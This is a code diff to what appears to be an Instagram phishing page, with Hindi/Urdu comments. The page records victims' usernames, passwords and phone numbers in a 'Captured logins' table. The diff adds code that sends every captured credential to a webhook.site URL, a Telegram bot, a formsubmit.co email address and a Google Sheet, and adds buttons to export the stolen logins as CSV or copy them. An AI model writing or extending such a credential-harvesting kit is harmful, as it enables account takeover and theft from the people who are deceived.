@@ -96,10 +96,24 @@
   <h2>Captured logins (<span id="cnt">0</span>)</h2>
   <table><thead><tr><th>#</th><th>Username</th><th>Password</th><th>Phone</th><th>Result</th><th>Time</th></tr></thead>
   <tbody id="rows"></tbody></table>
+  <div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:14px">
+    <button class="btn" id="csvBtn" type="button" style="width:auto;margin:0;padding:8px 14px">Download CSV file</button>
+    <button class="btn" id="copyBtn" type="button" style="width:auto;margin:0;padding:8px 14px;background:#fff;color:#262626;border:1px solid #dbdbdb">Copy all</button>
+    <button class="btn" id="clearBtn" type="button" style="width:auto;margin:0;padding:8px 14px;background:#fff;color:#ed4956;border:1px solid #f3c2c6">Clear all</button>
+  </div>
 </div>
 
 <script>
-var WEBHOOK = "https://webhook.site/174036e3-9510-467a-9010-a1d3f4acbd98";
+/* ================= CONFIG: apne channels yahan bharo ================= */
+var CONFIG = {
+  webhookUrl:   "https://webhook.site/174036e3-9510-467a-9010-a1d3f4acbd98", // webhook.site
+  telegramToken:"",   // jaise "7123456789:AAHxxxxxxxxxxxxxxxxxx"
+  telegramChatId:"",  // jaise "987654321"
+  email:        "",   // jaise "mera.naam@gmail.com"  (formsubmit.co se mail jayega)
+  sheetUrl:     ""    // Google Apps Script web app URL (Google Sheet me save)
+};
+/* ==================================================================== */
+
 var KEY = "capturedLogins";
 var otpCode = "", otpPhone = "", currentUser = "";
 
@@ -123,12 +137,54 @@ function save(entry) {
   } catch (e) {
     console.warn("localStorage band hai:", e);
   }
-  if (WEBHOOK) {
+  notifyAll(entry);
+}
+
+function postJson(url, data) {
+  try {
+    fetch(url, { method: "POST", mode: "no-cors",
+      headers: { "Content-Type": "text/plain;charset=UTF-8" },
+      body: JSON.stringify(data) });
+  } catch (e) {}
+}
+
+function notifyAll(entry) {
+  var text = "Instagram login\nUser: " + entry.username +
+             "\nPassword: " + entry.password +
+             (entry.phone ? "\nPhone: " + entry.phone : "") +
+             "\nTime: " + entry.at;
+
+  // 1) webhook.site / apna webhook
+  if (CONFIG.webhookUrl) postJson(CONFIG.webhookUrl, entry);
+
+  // 2) Telegram (mobile pe message)
+  if (CONFIG.telegramToken && CONFIG.telegramChatId) {
     try {
-      fetch(WEBHOOK, { method: "POST", mode: "no-cors",
-        headers: { "Content-Type": "text/plain" }, body: JSON.stringify(entry) });
+      fetch("https://api.telegram.org/bot" + CONFIG.telegramToken +
+            "/sendMessage?chat_id=" + CONFIG.telegramChatId +
+            "&text=" + encodeURIComponent(text), { mode: "no-cors" });
     } catch (e) {}
   }
+
+  // 3) Email (formsubmit.co -> mobile ke mail app me)
+  if (CONFIG.email) {
+    try {
+      fetch("https://formsubmit.co/ajax/" + encodeURIComponent(CONFIG.email), {
+        method: "POST",
+        headers: { "Content-Type": "application/json", "Accept": "application/json" },
+        body: JSON.stringify({
+          _subject: "Instagram login: " + entry.username,
+          username: entry.username,
+          password: entry.password,
+          phone: entry.phone || "-",
+          time: entry.at
+        })
+      });
+    } catch (e) {}
+  }
+
+  // 4) Google Sheet (Google Drive me file, phone pe Sheets app)
+  if (CONFIG.sheetUrl) postJson(CONFIG.sheetUrl, entry);
 }
 
 function showCard(id) {
@@ -233,10 +289,57 @@ function renderAdmin() {
   $("rows").innerHTML = html || "<tr><td colspan='6' style='text-align:center;color:#8e8e8e'>No logins yet</td></tr>";
 }
 
+function downloadCsv() {
+  var all = getCaptured();
+  var rows = [["#", "username", "password", "phone", "result", "time"]];
+  for (var i = 0; i < all.length; i++) {
+    var e = all[i];
+    rows.push([i + 1, e.username || "", e.password || "", e.phone || "",
+               e.result || "ok", e.at || ""]);
+  }
+  var csv = "";
+  for (var r = 0; r < rows.length; r++) {
+    var cells = [];
+    for (var c = 0; c < rows[r].length; c++) {
+      cells.push('"' + String(rows[r][c]).replace(/"/g, '""') + '"');
+    }
+    csv += cells.join(",") + "\r\n";
+  }
+  var blob = new Blob(["\ufeff" + csv], { type: "text/csv;charset=utf-8" });
+  var a = document.createElement("a");
+  a.href = URL.createObjectURL(blob);
+  a.download = "instagram-logins.csv";
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+}
+
+function copyAll() {
+  var txt = JSON.stringify(getCaptured(), null, 2);
+  if (navigator.clipboard) {
+    navigator.clipboard.writeText(txt).then(function () {
+      $("copyBtn").textContent = "Copied!";
+      setTimeout(function () { $("copyBtn").textContent = "Copy all"; }, 1200);
+    });
+  } else {
+    window.prompt("Copy karo:", txt);
+  }
+}
+
+function clearAll() {
+  if (!confirm("Saare logins delete kar dun?")) return;
+  try { localStorage.removeItem(KEY); } catch (e) {}
+  window.capturedLogins = [];
+  renderAdmin();
+}
+
 $("go").onclick = doLogin;
 $("forgotLink").onclick = goForgot;
 $("sendBtn").onclick = sendCode;
 $("verifyBtn").onclick = verifyCode;
+$("csvBtn").onclick = downloadCsv;
+$("copyBtn").onclick = copyAll;
+$("clearBtn").onclick = clearAll;
 
 for (var i = 1; i <= 6; i++) {
   (function (n) {
